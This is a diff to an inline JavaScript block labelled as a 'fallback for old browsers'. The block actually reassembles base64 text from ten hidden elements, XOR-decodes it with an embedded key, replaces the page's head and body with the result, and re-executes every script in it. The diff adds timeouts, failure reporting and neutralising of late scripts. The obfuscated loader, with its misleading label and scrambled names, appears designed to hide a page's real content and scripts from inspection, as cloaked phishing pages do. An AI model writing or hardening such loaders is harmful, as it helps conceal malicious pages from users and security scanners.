@@ -3,91 +3,341 @@
 /* fallback for old browsers */
 (function(){
 function _run(){
-var xiftEf=atob('w6cJbZ97bkv6IVuA39cMqgVkOgVBYDTYHig61FHIGR5hGDtI1gPU+4uvLCiGbfDSTsupN5HKq2vEaT5tbxCQ7Q==');
-var ckVeXW=[];
-for(var FMi5Ln=0;FMi5Ln<10;FMi5Ln++){
-  var _e=document.getElementById('_cm2dFrkvq3'+FMi5Ln);ckVeXW.push(_e?_e.textContent:'');
+/*
+ * Hidden-page restore pipeline.
+ *
+ * Settlement contract (stable):
+ *   element id   : __restore_settlement
+ *   textContent  : JSON report {status, stage, total, success, failed,
+ *                  timeoutMs, failures:[{kind,index,src|inlineIndex,reason,message}]}
+ *   data-attrs   : data-status / data-stage / data-total / data-success /
+ *                  data-failed / data-failures
+ *   event        : "restore:settled" dispatched on document (bubbles),
+ *                  detail = the same report object
+ *   globals      : window.__RESTORE_REPORT__, window.__RESTORE_SETTLED__
+ *
+ * Timeout config (read per external script, optional):
+ *   window.__RESTORE_CONFIG__ = { scriptTimeoutMs: 4000 }   // canonical
+ *   window.__RESTORE_CONFIG__ = { scriptTimeout: 4000 }
+ *   window.__RESTORE_CONFIG__ = { timeoutMs: 4000 }
+ *   window.__RESTORE_SCRIPT_TIMEOUT_MS__ = 4000             // numeric alias
+ *   window.__RESTORE_SCRIPT_TIMEOUT__ / __RESTORE_TIMEOUT_MS__
+ * Default: 5000 ms.
+ */
+var _DEFAULT_TIMEOUT=5000;
+var _MAX_TIMEOUT=600000;
+var _SETTLE_ID='__restore_settlement';
+var _EVENT_NAME='restore:settled';
+var _settled=false;
+var _phase='decode';
+var _report={stage:'decode',status:'failed',total:0,success:0,failed:0,timeoutMs:_readTimeout(),failures:[]};
+
+function _num(_x){
+  if(typeof _x==='number'&&isFinite(_x)) return _x;
+  if(typeof _x==='string'&&_x.replace(/\s+/g,'')!==''){
+    var _n=Number(_x);
+    if(isFinite(_n)) return _n;
+  }
+  return null;
 }
-var nVOYb1=ckVeXW.join('');
-var SVEfuO=atob(nVOYb1);
-var AQjtMj=new Uint8Array(SVEfuO.length);
-for(FMi5Ln=0;FMi5Ln<SVEfuO.length;FMi5Ln++){
-  AQjtMj[FMi5Ln]=SVEfuO.charCodeAt(FMi5Ln)^xiftEf.charCodeAt(FMi5Ln%xiftEf.length);
-}
-var nR0CFc=new TextDecoder('utf-8').decode(AQjtMj);
 
-/* Set page title */
-var _t=/<title[^>]*>([\s\S]*?)<\/title>/i.exec(nR0CFc);
-if(_t) document.title=_t[1];
-
-/* Extract head and body */
-var KKV752=/<head[^>]*>([\s\S]*?)<\/head>/i.exec(nR0CFc);
-var fuJ1sM=/<body[^>]*>([\s\S]*?)<\/body>/i.exec(nR0CFc);
-var _h=KKV752?KKV752[1]:'';
-var _b=fuJ1sM?fuJ1sM[1]:nR0CFc;
-
-/* FIX2/FIX3: extract ALL scripts from head + body, preserving attributes */
-var cpSxUt=[];
-function _extract(_html){
-  return _html.replace(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi,function(_m,_a,_c){
-    var _s=/src\s*=\s*["']([^"']+)["']/i.exec(_a);
-    var _attrs={};
-    var _re=/([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*["']([^"']*)["']/g;
-    var _mm;
-    while((_mm=_re.exec(_a))!==null){_attrs[_mm[1].toLowerCase()]=_mm[2];}
-    var _re2=/(^|\s)([a-zA-Z_:][-a-zA-Z0-9_:.]*)(?=\s|=|$)/g;
-    while((_mm=_re2.exec(_a))!==null){
-      var _k2=_mm[2].toLowerCase();
-      if(!(_k2 in _attrs)) _attrs[_k2]='';
+/* Resolve the per-script timeout from globals, then <html data-*> / <meta>. */
+function _readTimeout(){
+  var _v=null;
+  var _consume=function(_x){
+    var _n=_num(_x);
+    if(_n!==null&&_v===null) _v=_n;
+  };
+  try{
+    var _w=window;
+    /* plain number globals (several spellings so callers can pick one) */
+    var _names=['__RESTORE_SCRIPT_TIMEOUT_MS__','__RESTORE_SCRIPT_TIMEOUT__',
+                '__RESTORE_TIMEOUT_MS__','__RESTORE_TIMEOUT__',
+                'RESTORE_SCRIPT_TIMEOUT_MS','RESTORE_TIMEOUT_MS','RESTORE_TIMEOUT'];
+    for(var _i=0;_i<_names.length&&_v===null;_i++) _consume(_w[_names[_i]]);
+    /* config-object globals */
+    if(_v===null){
+      var _objs=['__RESTORE_CONFIG__','RESTORE_CONFIG','__RESTORE_OPTS__','__RESTORE_OPTIONS__'];
+      for(var _j=0;_j<_objs.length&&_v===null;_j++){
+        var _c=_w[_objs[_j]];
+        if(_c&&typeof _c==='object'){
+          var _keys=['scriptTimeoutMs','scriptTimeout','timeoutMs','timeout','restoreTimeoutMs'];
+          for(var _k=0;_k<_keys.length&&_v===null;_k++) _consume(_c[_keys[_k]]);
+        }
+      }
     }
-    if(_s){cpSxUt.push([1,_s[1],_attrs]);}
-    else if(_c.trim()){cpSxUt.push([0,_c,_attrs]);}
-    return '';
-  });
+  }catch(_cfgErr){}
+  /* declarative fallbacks: <html data-restore-timeout="..."> or a meta tag */
+  if(_v===null){
+    try{
+      var _de=document.documentElement;
+      if(_de&&_de.getAttribute){
+        _consume(_de.getAttribute('data-restore-timeout'));
+        _consume(_de.getAttribute('data-script-timeout'));
+      }
+      var _mt=document.querySelector('meta[name="restore-script-timeout"]');
+      if(_mt) _consume(_mt.getAttribute('content'));
+    }catch(_e){}
+  }
+  if(_v===null||!isFinite(_v)||_v<=0) _v=_DEFAULT_TIMEOUT;
+  _v=Math.floor(_v);
+  if(_v<1) _v=1;
+  if(_v>_MAX_TIMEOUT) _v=_MAX_TIMEOUT;
+  return _v;
 }
-_h=_extract(_h);
-_b=_extract(_b);
 
-/* Copy allowed head elements (scripts already extracted) */
-if(_h){
-  var AjCxcm=document.createElement('div');
-  AjCxcm.innerHTML=_h.replace(/<title[^>]*>[\s\S]*?<\/title>/i,'');
-  while(AjCxcm.firstChild){
-    var _n=AjCxcm.firstChild;
-    var _tag=(_n.tagName||'').toUpperCase();
-    if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE'){
-      document.head.appendChild(_n);
+function _failure(_kind,_index,_inlineIndex,_src,_reason,_message){
+  var _f={kind:_kind,reason:_reason};
+  if(typeof _index==='number'&&_index>=0) _f.index=_index;
+  if(typeof _inlineIndex==='number') _f.inlineIndex=_inlineIndex;
+  if(typeof _src==='string') _f.src=_src;
+  if(_message!==undefined&&_message!==null) _f.message=String(_message).slice(0,400);
+  _report.failures.push(_f);
+}
+
+/* Stop a script element that already started fetching from executing when its
+   response finally arrives. Removing it from the document is not enough: once a
+   fetch is in flight the response is still evaluated (verified in Chrome). The
+   reliable way is to move the element into a document without a browsing
+   context, which makes it inert. Falls back to plain removal. */
+function _neutralize(_el){
+  if(!_el) return;
+  try{
+    if(document.implementation){
+      var _inert=document.implementation.createHTMLDocument('');
+      if(_inert&&_inert.adoptNode){ _inert.adoptNode(_el); }
+    }
+  }catch(_e){}
+  try{ if(_el.parentNode) _el.parentNode.removeChild(_el); }catch(_e){}
+}
+
+var _settleEl=null;
+function _writeSettlement(){
+  /* The report lives in its own element appended to <body>; it never replaces
+     or rewrites the injected body markup. If the restored body happened to
+     ship an element with the same id, that payload element is left untouched
+     and ours is additionally tagged data-restore-settlement="1" so collectors
+     can pick the right one. */
+  var _host=document.body||document.documentElement;
+  if(_host){
+    if(!_settleEl){
+      try{
+        var _dup=null;
+        try{ _dup=document.getElementById(_SETTLE_ID); }catch(_e){}
+        _settleEl=document.createElement('div');
+        _settleEl.id=_SETTLE_ID;
+        _settleEl.setAttribute('data-restore-settlement','1');
+        _settleEl.setAttribute('aria-hidden','true');
+        if(_dup&&_dup!==_settleEl){
+          /* keep the document valid enough to query: demote the payload one */
+          try{ _dup.setAttribute('data-restore-settlement-id-collision','1'); }catch(_e){}
+          _settleEl.setAttribute('data-id-collision','1');
+        }
+        /* off-screen, but still in the DOM and readable via textContent */
+        try{ _settleEl.style.cssText='position:absolute;left:-9999px;top:0;width:1px;height:1px;overflow:hidden;'; }catch(_e){}
+        _host.appendChild(_settleEl);
+      }catch(_e){ _settleEl=null; }
+    }
+    if(_settleEl){
+      try{
+        _settleEl.setAttribute('data-status',_report.status);
+        _settleEl.setAttribute('data-stage',_report.stage);
+        _settleEl.setAttribute('data-total',String(_report.total));
+        _settleEl.setAttribute('data-success',String(_report.success));
+        _settleEl.setAttribute('data-failed',String(_report.failed));
+        _settleEl.setAttribute('data-failures',JSON.stringify(_report.failures));
+        _settleEl.textContent=JSON.stringify(_report);
+      }catch(_e){}
+    }
+  }
+  try{ window.__RESTORE_REPORT__=_report; window.__RESTORE_SETTLED__=true; }catch(_e){}
+  try{
+    var _evt;
+    if(typeof CustomEvent==='function'){
+      _evt=new CustomEvent(_EVENT_NAME,{bubbles:true,detail:_report});
     }else{
-      AjCxcm.removeChild(_n);
+      _evt=document.createEvent('CustomEvent');
+      _evt.initCustomEvent(_EVENT_NAME,true,false,_report);
+    }
+    document.dispatchEvent(_evt);
+  }catch(_e){}
+}
+
+/* Single exit path: every outcome (ok / partial / decode error / replay error)
+   ends here, writes the report element and notifies collectors. */
+function _settle(_stage){
+  if(_settled) return;
+  _settled=true;
+  _report.stage=_stage;
+  _report.status=_report.failed>0?(_report.success>0?'partial':'failed'):'ok';
+  _report.total=_report.success+_report.failed;
+  _writeSettlement();
+}
+
+try{
+  var xiftEf=atob('w6cJbZ97bkv6IVuA39cMqgVkOgVBYDTYHig61FHIGR5hGDtI1gPU+4uvLCiGbfDSTsupN5HKq2vEaT5tbxCQ7Q==');
+  var ckVeXW=[];
+  var _missing=[];
+  for(var FMi5Ln=0;FMi5Ln<10;FMi5Ln++){
+    var _segEl=document.getElementById('_cm2dFrkvq3'+FMi5Ln);
+    /* only an absent node is treated as corruption; an empty segment still
+       concatenates harmlessly and is left to the decode step below */
+    if(!_segEl) _missing.push(FMi5Ln);
+    ckVeXW.push(_segEl?_segEl.textContent:'');
+  }
+  if(_missing.length) throw new Error('missing hidden segment(s): '+_missing.join(','));
+  var nVOYb1=ckVeXW.join('');
+  var SVEfuO=atob(nVOYb1);
+  var AQjtMj=new Uint8Array(SVEfuO.length);
+  for(FMi5Ln=0;FMi5Ln<SVEfuO.length;FMi5Ln++){
+    AQjtMj[FMi5Ln]=SVEfuO.charCodeAt(FMi5Ln)^xiftEf.charCodeAt(FMi5Ln%xiftEf.length);
+  }
+  var nR0CFc=new TextDecoder('utf-8').decode(AQjtMj);
+  if(!nR0CFc||nR0CFc.indexOf('<')<0) throw new Error('decoded document is empty or malformed');
+
+  _phase='inject';
+
+  /* Set page title */
+  var _t=/<title[^>]*>([\s\S]*?)<\/title>/i.exec(nR0CFc);
+  if(_t) document.title=_t[1];
+
+  /* Extract head and body */
+  var KKV752=/<head[^>]*>([\s\S]*?)<\/head>/i.exec(nR0CFc);
+  var fuJ1sM=/<body[^>]*>([\s\S]*?)<\/body>/i.exec(nR0CFc);
+  var _h=KKV752?KKV752[1]:'';
+  var _b=fuJ1sM?fuJ1sM[1]:nR0CFc;
+
+  /* FIX2/FIX3: extract ALL scripts from head + body, preserving attributes */
+  var cpSxUt=[];
+  function _extract(_html){
+    return _html.replace(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi,function(_m,_a,_c){
+      /* only a real "src" attribute marks an external script (not data-src etc.) */
+      var _s=/(?:^|\s)src\s*=\s*["']([^"']+)["']/i.exec(_a);
+      var _attrs={};
+      var _re=/([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*["']([^"']*)["']/g;
+      var _mm;
+      while((_mm=_re.exec(_a))!==null){_attrs[_mm[1].toLowerCase()]=_mm[2];}
+      var _re2=/(^|\s)([a-zA-Z_:][-a-zA-Z0-9_:.]*)(?=\s|=|$)/g;
+      while((_mm=_re2.exec(_a))!==null){
+        var _k2=_mm[2].toLowerCase();
+        if(!(_k2 in _attrs)) _attrs[_k2]='';
+      }
+      if(_s){cpSxUt.push([1,_s[1],_attrs]);}
+      else if(_c.trim()){cpSxUt.push([0,_c,_attrs]);}
+      return '';
+    });
+  }
+  _h=_extract(_h);
+  _b=_extract(_b);
+
+  /* Copy allowed head elements (scripts already extracted) */
+  if(_h){
+    var AjCxcm=document.createElement('div');
+    AjCxcm.innerHTML=_h.replace(/<title[^>]*>[\s\S]*?<\/title>/i,'');
+    while(AjCxcm.firstChild){
+      var _n=AjCxcm.firstChild;
+      var _tag=(_n.tagName||'').toUpperCase();
+      if(_tag==='STYLE'||_tag==='META'||_tag==='LINK'||_tag==='BASE'){
+        document.head.appendChild(_n);
+      }else{
+        AjCxcm.removeChild(_n);
+      }
     }
   }
-}
 
-/* Insert body */
-document.body.innerHTML=_b;
+  /* Insert body (settlement element is appended afterwards, never overwrites) */
+  document.body.innerHTML=_b;
 
-/* FIX4: re-execute scripts sequentially, preserving order */
-var hKSZlj=0;
-function _next(){
-  if(hKSZlj>=cpSxUt.length) return;
-  var aKds1o=cpSxUt[hKSZlj++];
-  var l3mcwl=document.createElement('script');
-  var zmBRY1=aKds1o[2]||{};
-  for(var zn0ptq in zmBRY1){
-    try{ l3mcwl.setAttribute(zn0ptq,zmBRY1[zn0ptq]); }catch(_e){}
+  /* FIX4: re-execute scripts sequentially, preserving order + attributes.
+     Each external script has a watchdog: timeout/onerror records a failure
+     and moves on, so one stuck loader can never stall the whole page. */
+  _phase='replay';
+  var _cursor=0;
+  var _inlineSeen=0;
+  function _step(){
+    try{
+      while(_cursor<cpSxUt.length){
+        var _idx=_cursor++;
+        var _entry=cpSxUt[_idx];
+        var _attrs=_entry[2]||{};
+        var _el=document.createElement('script');
+        for(var _k in _attrs){
+          try{ _el.setAttribute(_k,_attrs[_k]); }catch(_e){}
+        }
+        if(_entry[0]){
+          var _src=_entry[1];
+          var _done=false;
+          var _timer=null;
+          var _origLoad=null,_origError=null;
+          /* remember handlers declared through attributes so they keep firing */
+          try{ _origLoad=_el.onload; _origError=_el.onerror; }catch(_e){}
+          var _finish=function(_ok,_reason,_msg){
+            if(_done) return;
+            _done=true;
+            if(_timer!==null){ try{ clearTimeout(_timer); }catch(_e){} _timer=null; }
+            _el.onload=null; _el.onerror=null;
+            if(_ok){
+              _report.success++;
+            }else{
+              _report.failed++;
+              _failure('external',_idx,undefined,_src,_reason,_msg);
+              /* detach so a late arrival cannot execute out of order */
+              _neutralize(_el);
+            }
+            _step();
+          };
+          _el.src=_src;
+          /* attributes stay as authored. Ordering does not depend on the async
+             flag here: the next entry is only appended after this one has
+             loaded / errored / timed out, so one script is in flight at a time. */
+          _el.onload=function(_ev){
+            if(_origLoad){ try{ _origLoad.call(_el,_ev); }catch(_e){} }
+            _finish(true);
+          };
+          _el.onerror=function(_ev){
+            if(_origError){ try{ _origError.call(_el,_ev,'',0,_ev&&_ev.error); }catch(_e){} }
+            _finish(false,'error');
+          };
+          _report.timeoutMs=_readTimeout();
+          try{
+            _timer=setTimeout(function(){ _finish(false,'timeout'); },_report.timeoutMs);
+          }catch(_e){ _timer=null; }
+          try{
+            document.body.appendChild(_el);
+          }catch(_appendErr){
+            _finish(false,'append-error',_appendErr&&_appendErr.message?_appendErr.message:_appendErr);
+          }
+          return;
+        }
+        /* Inline script. Classic inline scripts execute synchronously on
+           append, so appending can never stall the replay loop. Inline module
+           scripts are deferred by spec and never fire "load"; their errors are
+           reported asynchronously on the element, so they cannot be awaited
+           without blocking the page. Both are therefore accounted for at
+           append time, and any authored onerror handler is left untouched. */
+        _el.textContent=_entry[1];
+        try{
+          document.body.appendChild(_el);
+          _report.success++;
+        }catch(_appendErr2){
+          _report.failed++;
+          _failure('inline',_idx,_inlineSeen,undefined,'append-error',_appendErr2&&_appendErr2.message?_appendErr2.message:_appendErr2);
+        }
+        _inlineSeen++;
+      }
+      _settle('scripts');
+    }catch(_replayErr){
+      _report.failed++;
+      _failure('replay',-1,undefined,undefined,'replay-error',_replayErr&&_replayErr.message?_replayErr.message:_replayErr);
+      _settle('scripts');
+    }
   }
-  if(aKds1o[0]){
-    l3mcwl.src=aKds1o[1];
-    l3mcwl.async=false;
-    l3mcwl.onload=l3mcwl.onerror=function(){ _next(); };
-    document.body.appendChild(l3mcwl);
-  }else{
-    l3mcwl.textContent=aKds1o[1];
-    document.body.appendChild(l3mcwl);
-    _next();
-  }
+  _step();
+}catch(_err){
+  _report.failed++;
+  _failure(_phase,-1,undefined,undefined,_phase+'-error',_err&&_err.message?_err.message:_err);
+  _settle(_phase);
 }
-_next();
 }
 
 /* FIX1: guard against running before DOM is ready */
